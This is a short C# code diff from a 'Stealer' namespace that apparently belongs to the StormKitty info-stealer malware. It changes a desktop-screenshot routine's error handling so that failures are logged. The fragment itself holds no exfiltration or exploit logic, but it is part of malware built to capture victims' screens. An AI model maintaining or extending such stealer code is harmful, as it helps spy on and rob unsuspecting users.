@@ -19,7 +19,7 @@ namespace Stealer
                 Counter.DesktopScreenshot = true;
                 return true;
             }
-            catch { return false; }
+            catch (System.Exception ex) { return StormKitty.Logging.Log("DesktopScreenshot >> Failed to create\n" + ex, false); }
         }
     }
 }
